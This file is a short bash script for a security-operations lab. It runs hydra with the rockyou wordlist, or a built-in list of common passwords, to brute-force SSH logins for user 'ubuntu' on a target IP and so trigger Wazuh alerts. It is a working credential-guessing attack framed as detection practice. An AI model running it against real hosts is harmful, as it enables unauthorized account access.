#!/bin/bash
# SSH brute force simulation for SOC lab testing
# Run this from your Kali/attacker VM
# Usage: ./brute-force-ssh.sh <target-ip>

TARGET="${1:-192.168.64.2}"
USER="ubuntu"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Starting SSH brute force simulation against $TARGET"
echo "[*] This will generate alerts in Wazuh dashboard"
echo ""

if ! command -v hydra &>/dev/null; then
  echo "[!] Hydra not found. Installing..."
  apt-get install -y hydra 2>/dev/null || brew install hydra 2>/dev/null
fi

# Simulate with a small built-in password list if no wordlist exists
if [ ! -f "$WORDLIST" ]; then
  TMPLIST=$(mktemp)
  echo -e "password\n123456\nadmin\nroot\nletmein\nqwerty\npassword123\nwelcome" > "$TMPLIST"
  WORDLIST="$TMPLIST"
  echo "[*] Using built-in test password list"
fi

hydra -l "$USER" -P "$WORDLIST" -t 4 -V ssh://"$TARGET"

echo ""
echo "[+] Brute force simulation complete."
echo "[+] Check Wazuh dashboard → Security Events for alerts"
